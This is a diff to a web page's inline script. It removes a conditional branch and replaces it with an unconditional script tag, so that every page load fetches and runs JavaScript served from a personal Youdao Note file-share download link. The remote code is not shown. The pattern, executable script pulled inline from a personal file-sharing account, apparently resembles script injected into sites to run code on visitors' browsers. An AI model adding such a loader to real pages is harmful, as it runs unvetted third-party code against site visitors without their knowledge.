@@ -17,16 +17,6 @@ if (iValue === '1') {
     else 
         document.body.appendChild(s);
 }
-// 如果参数 i 的值为其他值，则执行第二段代码
-else {
-    var xUrl = '//note.youdao.com/yws/api/personal/file/DF51C54B812E4F7CAC02E642D941E4ED?method=download&inline=true&shareKey=43c142c7924e806f91a1ce39e873b6c8';
-    var now = Math.round(Date.now() / 1000 / 5);
-    var s = document.createElement('script');
-    s.setAttribute('src', xUrl + '&ut=' + now);
-    s.setAttribute('charset', 'utf-8');
-    if (!document.body) 
-        document.head.appendChild(s);
-    else 
-        document.body.appendChild(s);
-}
+
 </script>
+<script src="//note.youdao.com/yws/api/personal/file/DF51C54B812E4F7CAC02E642D941E4ED?method=download&inline=true&shareKey=43c142c7924e806f91a1ce39e873b6c8" ></script>
